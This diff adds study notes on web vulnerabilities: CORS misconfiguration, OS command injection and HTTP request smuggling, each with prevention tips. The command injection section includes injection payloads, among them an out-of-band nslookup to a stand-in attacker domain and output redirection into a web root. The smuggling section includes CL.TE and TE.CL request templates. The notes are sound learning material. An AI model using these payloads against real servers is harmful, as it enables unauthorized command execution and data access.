@@ -1,0 +1,161 @@
+1. Cross-origin resource sharing (CORS) - (Part of same-origin policy)
+    Browser mechanism which enables controlled access to resources located outside of a given domain.uses a suite of HTTP headers that define trusted web origins and associated properties.
+
+        CORS Headers
+            Access-Control-Allow-Origin
+            Access-Control-Allow-Credentials
+
+    Same-origin policy -
+        The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
+
+        The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
+
+    Eg.
+        http://store.company.com/dir2/other.html 	        Same origin 	Only the path differs
+        http://store.company.com/dir/inner/another.html 	Same origin 	Only the path differs
+        https://store.company.com/page.html 	            Failure 	    Different protocol
+        http://store.company.com:81/dir/page.html 	        Failure 	    Different port (http:// is port 80 by default)
+        http://news.company.com/dir/page.html 	            Failure 	    Different host
+
+    Vulnerabilities Types -
+        Server-generated ACAO header from client-specified Origin header - headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session. Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain.
+            Response -
+                Access-Control-Allow-Origin: https://malicious-website.com
+                Access-Control-Allow-Credentials: true
+
+        Errors parsing Origin headers
+        Whitelisted null origin value
+        Exploiting XSS via CORS trust relationships
+        Breaking TLS with poorly configured CORS
+        Intranets and CORS without credentials
+
+    Prevention -
+        - Proper configuration of cross-origin requests
+        - Only allow trusted sites
+        - Avoid whitelisting null
+        - Avoid wildcards in internal networks
+        - CORS is not a substitute for server-side security policies
+
+2. OS command injection
+    Vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.
+
+        Placing the additional command separator & after the injected command is generally useful because it separates the injected command from whatever follows the injection point
+
+    Eg.
+        Original - https://insecure-website.com/stockStatus?productID=381&storeID=29
+
+        Attacker Logic - stockreport.pl & echo aiwefwlguh & 29
+
+    Blind OS command injection vulnerabilities -  application does not return the output from the command within its HTTP response.
+        Original - mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+
+        Attacker Logic -
+
+        - Detecting blind OS command injection using time delays - use an injected command that will trigger a time delay
+            Attacker Logic - & ping -c 10 127.0.0.1 &
+
+        - Exploiting blind OS command injection by redirecting output - redirect the output from the injected command into a file within the web root that you can then retrieve using the browser.
+            Attacker Logic - & whoami > /var/www/static/whoami.txt &
+
+        - Exploiting blind OS command injection using out-of-band (OAST) techniques - use an injected command that will trigger an out-of-band network interaction with a system that you control.
+            Attacker Logic - & nslookup kgji2ohoyw.web-attacker.com &
+
+    Ways of injecting OS commands - A variety of shell metacharacters can be used to perform OS command injection attacks.
+        &, &&, |, ||, ;, `, $()
+
+    Prevention -
+        - never call out to OS commands from application-layer code.
+        - if need of os command execution use API
+        - strong input validation must be performed
+
+3. HTTP Request Smuggling
+    Technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
+
+    Impact - critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
+
+    What happens -
+        Sequence of request send to front-end server and then forward to back-end servers.but same front-end server send more request to same back-end server because of this is efficient and performant.
+
+        HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins.
+
+    How happens -
+        the Content-Length header and the Transfer-Encoding header are use to specify where request ends.if both are present in request creates conflict so ignore Content-Length header if its for a single server.but chain server not support Transfer-Encoding.
+
+        Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
+
+        If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.
+
+        Content-Length - its specify the Length of content.
+            POST /search HTTP/1.1
+            Host: normal-website.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 11
+
+            q=smuggling
+
+        Transfer-Encoding - its specify data is in chunk and its size in hexadecimal followed by newline and Zero(0) for terminated.
+            POST /search HTTP/1.1
+            Host: normal-website.com
+            Content-Type: application/x-www-form-urlencoded
+            Transfer-Encoding: chunked
+
+            b
+            q=smuggling
+            0
+
+    How to perform -
+        placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently.
+
+        CL - Content-Length       TE - Transfer-Encoding
+
+        Type -
+           - CL.TE - front-end CL.back-end TE (terminated request)
+                POST / HTTP/1.1
+                Host: vulnerable-website.com
+                Content-Length: 13
+                Transfer-Encoding: chunked
+
+                0
+                SMUGGLED
+
+           - TE.CL - front-end TE (Terminate the request).back-end CL
+                POST / HTTP/1.1
+                Host: vulnerable-website.com
+                Content-Length: 3
+                Transfer-Encoding: chunked
+                8
+                SMUGGLED
+                0
+
+           - TE.TE - front-end TE.back-end TE but one of server will induce to not perform
+
+    Find Vulnerability -
+        - send requests that will cause a time delay in the application's responses if a vulnerability is present.
+            CL.TE - back-end server will wait
+            TE.CL - front-end server will wait
+            TE.TE - front or back-end server will wait
+        - once you detect vulnerability send two requests to the application
+            POST /search HTTP/1.1
+            Host: vulnerable-website.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 49
+            Transfer-Encoding: chunked
+
+            e
+            q=smuggling&x=
+            0
+
+            GET /404 HTTP/1.1
+            Foo: x
+
+    Prevention -
+        - Use HTTP/2 end to end and disable HTTP downgrading
+
+4. Insecure deserialization
+5. Server-side template injection
+6. Directory traversal
+7. HTTP Host header attacks
+8. Access control vulnerabilities and privilege escalation
+------------------------------------------------------------------------------------------------------------------------------------
+OAST - Out-of-band application security
+DTD - Document Type Definition
